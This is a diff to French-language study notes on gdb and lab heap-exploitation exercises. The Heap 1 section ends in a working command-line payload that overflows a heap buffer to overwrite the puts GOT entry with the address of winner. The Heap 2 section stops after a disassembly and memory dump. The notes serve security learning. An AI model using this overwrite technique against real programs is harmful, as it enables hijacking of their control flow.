@@ -55,6 +55,10 @@ Step into (next instruction):
 
 > Execute one machine instruction, then stop and return to the debugger. 
 
+Continuer l'exécution (jusqu'au prochain point d'arret):
+
+	c[continue]
+
 Skip a function call:
 
 	ni
@@ -72,9 +76,9 @@ Print a value:
 	print nowinner
 	$4 = {void (void)} 0x8048478 <nowinner>
 
-Afficher le contenu d'une zone mémoire:
+Afficher le contenu d'une zone mémoire (ici de 1000 * 4 octets):
 
-	x/1000x <@ de début de la zone>
+		x/1000x <@ de début de la zone>
 
 # Utilisation de la pile
 
@@ -840,6 +844,260 @@ Du coup:
 	level passed
 
 # Heap 1
+
+Technique: il faut écraser l'adresse de `puts` pour la remplacer par celle de `winner`.
+
+	(gdb) print winner
+	$1 = {void (void)} 0x8048494 <winner>
+
+	(gdb) print puts
+	$2 = {<text variable, no debug info>} 0x80483cc <puts@plt>
+
+CF [ce lien](https://stackoverflow.com/questions/55773868/returning-a-value-in-x86-assembly-language)
+
+> `eax̀` is the register where by convention the return value is found. The caller will take the 
+> value of eax as the return value.
+
+Code:
+
+	0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
+	0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
+	0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax
+
+	0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
+	0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
+	0x080484e8 <main+47>:	mov    edx,eax
+
+	0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
+	0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
+	0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax
+
+	0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
+	0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
+	0x08048517 <main+94>:	mov    edx,eax
+
+Dans `gdb`
+
+	b *0x080484ce
+	b *0x080484e8 
+	b *0x080484fd
+	b *0x08048517
+
+Exécution:
+
+	(gdb) print/x $eax
+	$3 = 0x804a008
+	(gdb) c
+	Continuing.
+
+	Breakpoint 2, 0x080484e8 in main (argc=3, argv=0xbffff844) at heap1/heap1.c:25
+	25	in heap1/heap1.c
+	(gdb) print/x $eax
+	$5 = 0x804a018
+	(gdb) c
+	Continuing.
+
+	Breakpoint 3, 0x080484fd in main (argc=3, argv=0xbffff844) at heap1/heap1.c:27
+	27	in heap1/heap1.c
+	(gdb) print/x $eax
+	$6 = 0x804a028
+	(gdb) c
+	Continuing.
+
+	Breakpoint 4, 0x08048517 in main (argc=3, argv=0xbffff844) at heap1/heap1.c:29
+	29	in heap1/heap1.c
+	(gdb) print/x $eax
+	$7 = 0x804a038
+
+Adresse de retour du premier malloc (`i1`):
+
+	(gdb) x/x $eax
+	0x804a008:	0x00000001
+
+Adresse de retour du deuxième malloc (`i1->name`):
+
+	(gdb) x/x $eax
+	0x804a018:	0x00000002
+
+Adresse de retour du troisième malloc (`i2`):
+
+	(gdb) x/x $eax
+	0x804a028:	0x00000002
+
+Adresse de retour du quatrième malloc (`i2->name`):
+
+	(gdb) x/x $eax
+	0x804a038:	0x00000002
+
+Note:
+
+	(gdb) print &((struct internet *)0)->priority
+	$2 = (int *) 0x0
+	(gdb) print &((struct internet *)0)->name
+	$1 = (char **) 0x4
+
+Adresse du `puts`:
+
+	0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
+	0x08048561 <main+168>:	call   0x80483cc <puts@plt>
+	0x08048566 <main+173>:	leave  
+
+	(gdb) disassemble 0x80483cc
+	Dump of assembler code for function puts@plt:
+	0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
+	0x080483d2 <puts@plt+6>:	push   0x30
+	0x080483d7 <puts@plt+11>:	jmp    0x804835c
+	End of assembler dump.
+
+L'adresse de `puts` est `*(0x8049774)` (jump "indirecte")
+
+	(gdb) print/x *(0x8049774)
+	$10 = 0x80483d2
+
+Stratégie:
+
+On écrase `i2->name` avec `i1->name`. Puis on écrase `puts` (`0x20646e61`) avec `i2`.
+
+	(gdb) print (0x804a028 + 4) - 0x804a018
+	$3 = 20
+
+Et:
+
+	(gdb) print winner
+	$11 = {void (void)} 0x8048494 <winner>
+
+Donc:
+
+	r `python -c 'print("A" * 20 + "\x74\x97\x04\x08"')` `python -c 'print("\x94\x84\x04\x08"')` 
+
+
+
+# heap 2
+
+ASM:
+
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x080485c4 <main+0>:	push   %ebp
+	0x080485c5 <main+1>:	mov    %esp,%ebp
+	0x080485c7 <main+3>:	and    $0xfffffff0,%esp
+	0x080485ca <main+6>:	sub    $0x90,%esp
+	0x080485d0 <main+12>:	jmp    0x80485d3 <main+15>
+	0x080485d2 <main+14>:	nop
+	0x080485d3 <main+15>:	mov    0x80499c0,%ecx
+	0x080485d9 <main+21>:	mov    0x80499bc,%edx
+	0x080485df <main+27>:	mov    $0x8048810,%eax
+	0x080485e4 <main+32>:	mov    %ecx,0x8(%esp)
+	0x080485e8 <main+36>:	mov    %edx,0x4(%esp)
+	0x080485ec <main+40>:	mov    %eax,(%esp)
+	0x080485ef <main+43>:	call   0x80484bc <printf@plt>
+	0x080485f4 <main+48>:	mov    0x80499b0,%eax
+	0x080485f9 <main+53>:	mov    %eax,0x8(%esp)
+	0x080485fd <main+57>:	movl   $0x80,0x4(%esp)
+	0x08048605 <main+65>:	lea    0x10(%esp),%eax
+	0x08048609 <main+69>:	mov    %eax,(%esp)
+	0x0804860c <main+72>:	call   0x804845c <fgets@plt>
+	0x08048611 <main+77>:	test   %eax,%eax
+	0x08048613 <main+79>:	jne    0x8048617 <main+83>
+	0x08048615 <main+81>:	leave  
+	0x08048616 <main+82>:	ret    
+	0x08048617 <main+83>:	movl   $0x5,0x8(%esp)
+	0x0804861f <main+91>:	movl   $0x804882d,0x4(%esp)
+	0x08048627 <main+99>:	lea    0x10(%esp),%eax
+	0x0804862b <main+103>:	mov    %eax,(%esp)
+	0x0804862e <main+106>:	call   0x80484ec <strncmp@plt>
+	0x08048633 <main+111>:	test   %eax,%eax
+	0x08048635 <main+113>:	jne    0x8048691 <main+205>
+	0x08048637 <main+115>:	movl   $0x4,(%esp)
+	0x0804863e <main+122>:	call   0x80484cc <malloc@plt>
+	0x08048643 <main+127>:	mov    %eax,0x80499bc
+	0x08048648 <main+132>:	mov    0x80499bc,%eax
+	0x0804864d <main+137>:	movl   $0x24,0x8(%esp)
+	0x08048655 <main+145>:	movl   $0x0,0x4(%esp)
+	0x0804865d <main+153>:	mov    %eax,(%esp)
+	0x08048660 <main+156>:	call   0x804846c <memset@plt>
+	0x08048665 <main+161>:	lea    0x10(%esp),%eax
+	0x08048669 <main+165>:	add    $0x5,%eax
+	0x0804866c <main+168>:	mov    %eax,(%esp)
+	0x0804866f <main+171>:	call   0x804849c <strlen@plt>
+	0x08048674 <main+176>:	cmp    $0x1e,%eax
+	0x08048677 <main+179>:	ja     0x8048691 <main+205>
+	0x08048679 <main+181>:	lea    0x10(%esp),%eax
+	0x0804867d <main+185>:	lea    0x5(%eax),%edx
+	0x08048680 <main+188>:	mov    0x80499bc,%eax
+	0x08048685 <main+193>:	mov    %edx,0x4(%esp)
+	0x08048689 <main+197>:	mov    %eax,(%esp)
+	0x0804868c <main+200>:	call   0x80484ac <strcpy@plt>
+	0x08048691 <main+205>:	movl   $0x5,0x8(%esp)
+	0x08048699 <main+213>:	movl   $0x8048833,0x4(%esp)
+	0x080486a1 <main+221>:	lea    0x10(%esp),%eax
+	0x080486a5 <main+225>:	mov    %eax,(%esp)
+	0x080486a8 <main+228>:	call   0x80484ec <strncmp@plt>
+	0x080486ad <main+233>:	test   %eax,%eax
+	0x080486af <main+235>:	jne    0x80486be <main+250>
+	0x080486b1 <main+237>:	mov    0x80499bc,%eax
+	0x080486b6 <main+242>:	mov    %eax,(%esp)
+	0x080486b9 <main+245>:	call   0x804848c <free@plt>
+	0x080486be <main+250>:	movl   $0x6,0x8(%esp)
+	0x080486c6 <main+258>:	movl   $0x8048839,0x4(%esp)
+	0x080486ce <main+266>:	lea    0x10(%esp),%eax
+	0x080486d2 <main+270>:	mov    %eax,(%esp)
+	0x080486d5 <main+273>:	call   0x80484ec <strncmp@plt>
+	0x080486da <main+278>:	test   %eax,%eax
+	0x080486dc <main+280>:	jne    0x80486f2 <main+302>
+	0x080486de <main+282>:	lea    0x10(%esp),%eax
+	0x080486e2 <main+286>:	add    $0x7,%eax
+	0x080486e5 <main+289>:	mov    %eax,(%esp)
+	0x080486e8 <main+292>:	call   0x80484fc <strdup@plt>
+	0x080486ed <main+297>:	mov    %eax,0x80499c0
+	0x080486f2 <main+302>:	movl   $0x5,0x8(%esp)
+	0x080486fa <main+310>:	movl   $0x8048841,0x4(%esp)
+	0x08048702 <main+318>:	lea    0x10(%esp),%eax
+	0x08048706 <main+322>:	mov    %eax,(%esp)
+	0x08048709 <main+325>:	call   0x80484ec <strncmp@plt>
+	0x0804870e <main+330>:	test   %eax,%eax
+	0x08048710 <main+332>:	jne    0x80485d2 <main+14>
+	0x08048716 <main+338>:	mov    0x80499bc,%eax
+	0x0804871b <main+343>:	mov    0x20(%eax),%eax
+	0x0804871e <main+346>:	test   %eax,%eax
+	0x08048720 <main+348>:	je     0x8048733 <main+367>
+	0x08048722 <main+350>:	movl   $0x8048847,(%esp)
+	0x08048729 <main+357>:	call   0x80484dc <puts@plt>
+	0x0804872e <main+362>:	jmp    0x80485d3 <main+15>
+	0x08048733 <main+367>:	movl   $0x8048863,(%esp)
+	0x0804873a <main+374>:	call   0x80484dc <puts@plt>
+	0x0804873f <main+379>:	jmp    0x80485d3 <main+15>
+	End of assembler dump.
+
+Point d'arret:
+
+**call   0x804845c <fgets@plt>**:
+
+	b *0x0804860c
+
+
+
+
+
+	(gdb) print line
+	$1 = "auth login\n\000\330\367\377\277T\372\377\267\000\000\000\000(\033\376\267\001\000\000\000\000\000\000\000\001\000\000\000\370\370\377\267n\030\360\267\364\177\375\267ea췈\367\377\277u\332\352\267\364\177\375\267l\231\004\b\230\367\377\277\070\204\004\b@\020\377\267l\231\004\b\310\367\377\277y\207\004\b\004\203\375\267\364\177\375\267`\207\004\b\310\367\377\277ec\354\267@\020\377\267k\207\004\b\364\177", <incomplete sequence \375\267>
+	(gdb) print &line
+	$2 = (char (*)[128]) 0xbffff740
+	(gdb) print *line
+	$3 = 97 'a'
+	(gdb) print &line
+	$4 = (char (*)[128]) 0xbffff740
+
+
+
+
+
+
+
+
+
+
+
 
 
 
